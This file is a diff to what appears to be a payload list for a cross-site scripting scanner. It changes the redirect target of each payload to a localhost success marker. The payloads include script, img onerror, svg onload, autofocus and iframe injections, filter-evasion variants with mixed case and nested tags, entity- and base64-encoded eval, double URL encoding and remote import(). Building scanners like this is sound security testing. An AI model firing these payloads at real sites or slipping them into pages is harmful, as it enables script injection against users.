@@ -1,41 +1,41 @@
-<script>location.href='http://127.0.0.1:3000/test'</script>
-<sCrIpT>lOcAtIoN.hReF='http://127.0.0.1:3000/test'</sCrIpT>
-<scrscriptipt>location.href='http://127.0.0.1:3000/test'</scrscriptipt>
-<sCrScRiPtIpT>lOcAtIoN.hReF='http://127.0.0.1:3000/test'</sCrScRiPtIpT>
-<a href='http://127.0.0.1:3000/test'></a>
-<a hReF='http://127.0.0.1:3000/test'></a>
-<a hrhrefef='http://127.0.0.1:3000/test'></a>
-<a hRhReFeF='http://127.0.0.1:3000/test'></a>
-<img src='#' onerror='location.href('http://127.0.0.1:3000/test');'>
-<iimgmg ssrcrc='#' oneonerrorrror='localocationtion.hrhrefef('http://127.0.0.1:3000/test');'>
-<iMg sRc='#' oNeRrOr='lOcAtIoN.hReF('http://127.0.0.1:3000/test');'>
-<iImGmG sSrCrC='#' oNeOnErRoRrRoR='lOcAlOcAtIoNtIoN.hRhReFeF('http://127.0.0.1:3000/test');'>
-<svg src='#' onload=location.href='http://127.0.0.1:3000/test'>
-<sVg sRc='#' oNlOaD=lOcAtIoN.href='http://127.0.0.1:3000/test'>
-<ssvgvg ssrcrc='#' onlonloadoad=localocationtion.hrhrefef='http://127.0.0.1:3000/test'>
-<sSvGvG sSrCrC='#' oNlOnLoAdOaD=lOcAlOcAtIoNtIoN.hRhReFeF='http://127.0.0.1:3000/test'>
-<input type='text' id='xxs_scanning' onfocus='location.href='http://127.0.0.1:3000/test'' autofocus>
-<iNpUt tYpE='text' iD='xxs_scanning' oNfOcUs='location.href='http://127.0.0.1:3000/test'' aUtOfOcUs>
+<script>location.href='http://127.0.0.1/scan_injection_success'</script>
+<sCrIpT>lOcAtIoN.hReF='http://127.0.0.1/scan_injection_success'</sCrIpT>
+<scrscriptipt>location.href='http://127.0.0.1/scan_injection_success'</scrscriptipt>
+<sCrScRiPtIpT>lOcAtIoN.hReF='http://127.0.0.1/scan_injection_success'</sCrScRiPtIpT>
+<a href='http://127.0.0.1/scan_injection_success'></a>
+<a hReF='http://127.0.0.1/scan_injection_success'></a>
+<a hrhrefef='http://127.0.0.1/scan_injection_success'></a>
+<a hRhReFeF='http://127.0.0.1/scan_injection_success'></a>
+<img src='#' onerror='location.href('http://127.0.0.1/scan_injection_success');'>
+<iimgmg ssrcrc='#' oneonerrorrror='localocationtion.hrhrefef('http://127.0.0.1/scan_injection_success');'>
+<iMg sRc='#' oNeRrOr='lOcAtIoN.hReF('http://127.0.0.1/scan_injection_success');'>
+<iImGmG sSrCrC='#' oNeOnErRoRrRoR='lOcAlOcAtIoNtIoN.hRhReFeF('http://127.0.0.1/scan_injection_success');'>
+<svg src='#' onload=location.href='http://127.0.0.1/scan_injection_success'>
+<sVg sRc='#' oNlOaD=lOcAtIoN.href='http://127.0.0.1/scan_injection_success'>
+<ssvgvg ssrcrc='#' onlonloadoad=localocationtion.hrhrefef='http://127.0.0.1/scan_injection_success'>
+<sSvGvG sSrCrC='#' oNlOnLoAdOaD=lOcAlOcAtIoNtIoN.hRhReFeF='http://127.0.0.1/scan_injection_success'>
+<input type='text' id='xxs_scanning' onfocus='location.href='http://127.0.0.1/scan_injection_success'' autofocus>
+<iNpUt tYpE='text' iD='xxs_scanning' oNfOcUs='location.href='http://127.0.0.1/scan_injection_success'' aUtOfOcUs>
 <iframe srcdoc='<img src=about: onerror=parent.alert(document.domain)>'></iframe>
 <iFrAmE sRcDoC='<img src=about: onerror=parent.alert(document.domain)>'></iFrAmE>
-><script>location.href='http://127.0.0.1:3000/test'</script>
-><sCrIpT>lOcAtIoN.hReF='http://127.0.0.1:3000/test'</sCrIpT>
-><scrscriptipt>location.href='http://127.0.0.1:3000/test'</scrscriptipt>
-><sCrsCrIpTipT>lOcAtIoN.hReF='http://127.0.0.1:3000/test'</sCrScRiPtIpT>
-><a href='http://127.0.0.1:3000/test'></a>
-><a hReF='http://127.0.0.1:3000/test'></a>
-><a hrhrefef='http://127.0.0.1:3000/test'></a>
-><a hRhReFeF='http://127.0.0.1:3000/test'></a>
-><img src='#' onerror='location.href('http://127.0.0.1:3000/test');'>
-><img src='#' oNeRrOr='lOcAtIoN.hReF('http://127.0.0.1:3000/test');'>
-><iimgmg ssrcrc='#' oneonerrorrror='localocationtion.hrhrefef('http://127.0.0.1:3000/test');'>
-><iImGmG sSrCrC='#' oNeOnErRoRrRoR='lOcAlOcAtIoNtIoN.hRhReFeF('http://127.0.0.1:3000/test');'>
-><svg src='#' onload=location.href='http://127.0.0.1:3000/test'>
-><sVg sRc='#' oNlOaD=lOcAtIoN.hReF='http://127.0.0.1:3000/test'>
-><ssvgvg ssrcrc='#' onlonloadoad=localocationtion.hrhrefef='http://127.0.0.1:3000/test'>
-><sSvGvG sSrCrC='#' oNlOnLoAdOaD=lOcAlOcAtIoNtIoN.hRhReFeF='http://127.0.0.1:3000/test'>
-><input type='text' id='xxs_scanning' onfocus='location.href='http://127.0.0.1:3000/test'' autofocus>
-><iNpUt tYpE='text' iD='xxs_scanning' oNfOcUs='location.href='http://127.0.0.1:3000/test'' aUtOfOcus>
+><script>location.href='http://127.0.0.1/scan_injection_success'</script>
+><sCrIpT>lOcAtIoN.hReF='http://127.0.0.1/scan_injection_success'</sCrIpT>
+><scrscriptipt>location.href='http://127.0.0.1/scan_injection_success'</scrscriptipt>
+><sCrsCrIpTipT>lOcAtIoN.hReF='http://127.0.0.1/scan_injection_success'</sCrScRiPtIpT>
+><a href='http://127.0.0.1/scan_injection_success'></a>
+><a hReF='http://127.0.0.1/scan_injection_success'></a>
+><a hrhrefef='http://127.0.0.1/scan_injection_success'></a>
+><a hRhReFeF='http://127.0.0.1/scan_injection_success'></a>
+><img src='#' onerror='location.href('http://127.0.0.1/scan_injection_success');'>
+><img src='#' oNeRrOr='lOcAtIoN.hReF('http://127.0.0.1/scan_injection_success');'>
+><iimgmg ssrcrc='#' oneonerrorrror='localocationtion.hrhrefef('http://127.0.0.1/scan_injection_success');'>
+><iImGmG sSrCrC='#' oNeOnErRoRrRoR='lOcAlOcAtIoNtIoN.hRhReFeF('http://127.0.0.1/scan_injection_success');'>
+><svg src='#' onload=location.href='http://127.0.0.1/scan_injection_success'>
+><sVg sRc='#' oNlOaD=lOcAtIoN.hReF='http://127.0.0.1/scan_injection_success'>
+><ssvgvg ssrcrc='#' onlonloadoad=localocationtion.hrhrefef='http://127.0.0.1/scan_injection_success'>
+><sSvGvG sSrCrC='#' oNlOnLoAdOaD=lOcAlOcAtIoNtIoN.hRhReFeF='http://127.0.0.1/scan_injection_success'>
+><input type='text' id='xxs_scanning' onfocus='location.href='http://127.0.0.1/scan_injection_success'' autofocus>
+><iNpUt tYpE='text' iD='xxs_scanning' oNfOcUs='location.href='http://127.0.0.1/scan_injection_success'' aUtOfOcus>
 ><iframe srcdoc='<img src=about: onerror=parent.alert(document.domain)>'></iframe>
 ><iFrAmE sRcDoC='<img src=about: onerror=parent.alert(document.domain)>'></iFrAmE>
 <script>location.href='&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x5F;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2F;&#x52;&#x65;&#x66;&#x6C;&#x65;&#x63;&#x74;&#x65;&#x64;&#x5F;&#x58;&#x53;&#x53;&#x5F;&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;'</script>
@@ -83,9 +83,9 @@ Boolean[decodeURI('%63%6F%6E%73%74%72%75%63%74%6F%72')](decodeURI('%6C%6F%63%61%
 ><iFrAmE sRcDoC='&#x3C;&#x69;&#x6D;&#x67;&#x20;&#x73;&#x72;&#x63;&#x3D;&#x61;&#x62;&#x6F;&#x75;&#x74;&#x3A;&#x20;&#x6F;&#x6E;&#x65;&#x72;&#x72;&#x6F;&#x72;&#x3D;&#x70;&#x61;&#x72;&#x65;&#x6E;&#x74;&#x2E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x64;&#x6F;&#x63;&#x75;&#x6D;&#x65;&#x6E;&#x74;&#x2E;&#x64;&#x6F;&#x6D;&#x61;&#x69;&#x6E;&#x29;&#x3E;'></iFrAmE>
 ><svg onload='window['eval'](window['atob']('bG9jYXRpb24uaHJlZj0iaHR0cDovL2NoZWNrX3NlcnZlci9SZWZsZWN0ZWRfWFNTX1N1Y2Nlc3Mi'))'>
 ><sVg oNlOaD='window['eval'](window['atob']('bG9jYXRpb24uaHJlZj0iaHR0cDovL2NoZWNrX3NlcnZlci9SZWZsZWN0ZWRfWFNTX1N1Y2Nlc3Mi'))'>
-%253Cscript%253Elocation.href='http://127.0.0.1:3000/test'%253C/script%253E
-%253CsCrIpT%253ElOcAtIoN.hReF='http://127.0.0.1:3000/test'%253C/sCripT%253E
-<script>import('http://127.0.0.1:3000/test');<script>
-<sCrIpT>import('http://127.0.0.1:3000/test');<sCrIpT>
-><script>import('http://127.0.0.1:3000/test');<script>
-><sCrIpT>import('http://127.0.0.1:3000/test');<sCrIpT>
+%253Cscript%253Elocation.href='http://127.0.0.1/scan_injection_success'%253C/script%253E
+%253CsCrIpT%253ElOcAtIoN.hReF='http://127.0.0.1/scan_injection_success'%253C/sCripT%253E
+<script>import('http://127.0.0.1/scan_injection_success');<script>
+<sCrIpT>import('http://127.0.0.1/scan_injection_success');<sCrIpT>
+><script>import('http://127.0.0.1/scan_injection_success');<script>
+><sCrIpT>import('http://127.0.0.1/scan_injection_success');<sCrIpT>
